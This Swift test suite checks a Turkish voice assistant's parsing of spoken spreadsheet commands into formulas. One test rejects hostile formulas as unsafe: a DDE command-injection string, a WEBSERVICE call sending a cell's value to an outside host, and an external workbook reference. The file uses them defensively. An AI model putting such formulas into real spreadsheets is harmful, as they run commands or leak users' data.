import Foundation
import Testing
@testable import AsistanCore

@Suite("SpreadsheetCommand")
struct SpreadsheetCommandTests {
    private func parse(_ text: String) -> SpreadsheetCommand? {
        SpreadsheetCommand.parse(TurkishNumberParser.digitize(text))
    }

    private func cell(_ text: String) -> CellReference { CellReference(text)! }

    @Test("cell references in written and spoken form", arguments: [
        ("D3", "D3"), ("aa12", "AA12"), ("b 1", nil), ("XFE1", nil), ("A0", nil),
    ] as [(String, String?)])
    func references(text: String, expected: String?) {
        #expect(CellReference(text)?.address == expected)
    }

    @Test("adding two cells into a third, however it was heard", arguments: [
        "D3'e B2 ile B1'i topla", "D3'e B2 + B1'i topla", "d3 e b2 ve b1 i topla", "de üç'e be iki ile be bir'i topla",
        "B2 ile B1'i topla D3'e yaz", "B2 ile B1'i toplayıp D3'e yaz", "D3 hücresine B2 ile B1'i topla",
    ])
    func addition(text: String) {
        #expect(parse(text) == .setFormula(target: cell("D3"), formula: "=B2+B1"))
    }

    @Test("arithmetic with spoken operators and numbers", arguments: [
        ("D3'e B2 artı B1 yaz", "=B2+B1"),
        ("D3 eşittir B2 çarpı 1,2", "=B2*1.2"),
        ("E5'e C5 eksi D5 bölü 2 yaz", "=C5-D5/2"),
        ("F1'e A1 ile A2 ve A3'ü topla", "=A1+A2+A3"),
        ("D3'e B2'den B1'i çıkar", "=B2-B1"),
        ("D3'e B2 ile 3'ü çarp", "=B2*3"),
        ("D3'e B2'yi B1'e böl", "=B2/B1"),
    ])
    func arithmetic(text: String, formula: String) {
        guard case let .setFormula(_, actual)? = parse(text) else {
            Issue.record("\(text) not parsed: \(String(describing: parse(text)))")
            return
        }
        #expect(actual == formula)
    }

    @Test("functions over a range", arguments: [
        ("B10'a B1'den B9'a kadar topla", "B10", "=SUM(B1:B9)"),
        ("B1'den B9'a kadar olan toplamı B10'a yaz", "B10", "=SUM(B1:B9)"),
        ("C12'ye C2 ile C11 arasının ortalamasını yaz", "C12", "=AVERAGE(C2:C11)"),
        ("D1'e A1'den A20'ye kadar en büyük değeri yaz", "D1", "=MAX(A1:A20)"),
        ("D2'ye A1'den A20'ye kadar en küçüğünü yaz", "D2", "=MIN(A1:A20)"),
    ])
    func functions(text: String, target: String, formula: String) {
        #expect(parse(text) == .setFormula(target: cell(target), formula: formula))
    }

    @Test("writing a number or a word")
    func values() {
        #expect(parse("C5'e 1250 yaz") == .setValue(target: cell("C5"), value: .number(1250)))
        #expect(parse("C5'e 12,5 yaz") == .setValue(target: cell("C5"), value: .number(12.5)))
        #expect(parse("A1'e Kira Gideri yaz") == .setValue(target: cell("A1"), value: .text("Kira Gideri")))
    }

    @Test("reading, clearing and copying")
    func others() {
        #expect(parse("D3'ü oku") == .read(cell("D3")))
        #expect(parse("D3 kaç") == .read(cell("D3")))
        #expect(parse("D3'te ne var") == .read(cell("D3")))
        #expect(parse("D3'ü sil") == .clear(cell("D3")))
        #expect(parse("D3'ü temizle") == .clear(cell("D3")))
        #expect(parse("D3'ü E3'e kopyala") == .copy(from: cell("D3"), to: cell("E3")))
    }

    @Test("questions about a range are answered without writing")
    func evaluate() {
        #expect(parse("B1'den B9'a kadar toplam kaç") == .evaluate(formula: "SUM(B1:B9)"))
        #expect(parse("C sütununun ortalaması ne") == .evaluate(formula: "AVERAGE(C:C)"))
        #expect(parse("B2 ile B1'in toplamı kaç") == .evaluate(formula: "B2+B1"))
    }

    @Test("undo and leaving spreadsheet mode")
    func session() {
        #expect(parse("geri al") == .undo)
        #expect(parse("son işlemi geri al") == .undo)
        #expect(parse("tamam bitti") == .finish)
        #expect(parse("Excel modundan çık") == .finish)
    }

    @Test("everyday sentences are not spreadsheet commands", arguments: [
        "Safari'yi aç", "B12 vitamini nedir", "saat 3'te toplantı ekle", "5 dakika sonra hatırlat",
        "Ahmet'e mesaj at", "sesi yüzde 30 yap", "yarın hava nasıl", "iPhone 15 kaç lira",
    ])
    func unrelated(text: String) {
        #expect(parse(text) == nil)
    }

    @Test("none of the routing benchmark commands is taken for a spreadsheet command")
    func benchmarkCommands() throws {
        let bench = URL(filePath: #filePath).deletingLastPathComponent().appending(path: "../../../../../bench").standardized
        let files = try FileManager.default.contentsOfDirectory(at: bench, includingPropertiesForKeys: nil)
            .filter { $0.pathExtension == "tsv" && $0.lastPathComponent.hasPrefix("llm") || $0.lastPathComponent.hasPrefix("realworld") }
        #expect(!files.isEmpty)
        for file in files {
            for line in try String(contentsOf: file, encoding: .utf8).split(separator: "\n") {
                let command = String(line.split(separator: "\t").first ?? "")
                #expect(parse(command) == nil, "\(file.lastPathComponent): \(command) → \(String(describing: parse(command)))")
            }
        }
    }

    @Test("model-written formulas are limited to plain calculation", arguments: [
        ("=C2*1,2", true), ("=SUM(B1:B9)/COUNT(B1:B9)", true), ("=IF(A1>100,\"Yüksek\",\"Düşük\")", false),
        ("=IF(A1>100,\"Yuksek\",\"Dusuk\")", true), ("=Sheet2!A1*2", true),
        ("=WEBSERVICE(\"http://x.com/?\"&A1)", false), ("=HYPERLINK(\"http://x\")", false), ("=cmd|' /C calc'!A0", false),
        ("='[secret.xlsx]Sheet1'!A1", false), ("C2*2", false), ("=", false), ("=INDIRECT(A1)", false),
    ])
    func formulaSafety(formula: String, safe: Bool) {
        #expect(SpreadsheetFormula.isSafe(formula) == safe)
    }

    @Test("requests that talk about cells are recognized for the model fallback")
    func mentions() {
        #expect(SpreadsheetCommand.mentionsCells("D2'ye C2'nin KDV'li fiyatını hesapla"))
        #expect(SpreadsheetCommand.mentionsCells("bu sütunu biçimlendir"))
        #expect(!SpreadsheetCommand.mentionsCells("akşam ne yiyoruz"))
    }

    @Test("questions are computed from the values read from the sheet")
    func evaluator() {
        #expect(SpreadsheetEvaluator.references(in: "SUM(B1:B9)") == ["B1:B9"])
        #expect(SpreadsheetEvaluator.references(in: "B2+B1*2") == ["B2", "B1"])
        #expect(SpreadsheetEvaluator.references(in: "AVERAGE(C:C)") == ["C:C"])
        let values = ["B1:B9": ["4.0", "20,5", "", "Kira"], "B2": ["20.5"], "B1": ["4"]]
        #expect(SpreadsheetEvaluator.evaluate("SUM(B1:B9)", values: values) == 24.5)
        #expect(SpreadsheetEvaluator.evaluate("AVERAGE(B1:B9)", values: values) == 12.25)
        #expect(SpreadsheetEvaluator.evaluate("COUNT(B1:B9)", values: values) == 2)
        #expect(SpreadsheetEvaluator.evaluate("MAX(B1:B9)", values: values) == 20.5)
        #expect(SpreadsheetEvaluator.evaluate("B2+B1*2", values: values) == 28.5)
        #expect(SpreadsheetEvaluator.evaluate("B2/B3", values: values) == nil)
        #expect(SpreadsheetEvaluator.evaluate("AVERAGE(D1:D9)", values: [:]) == nil)
    }
}
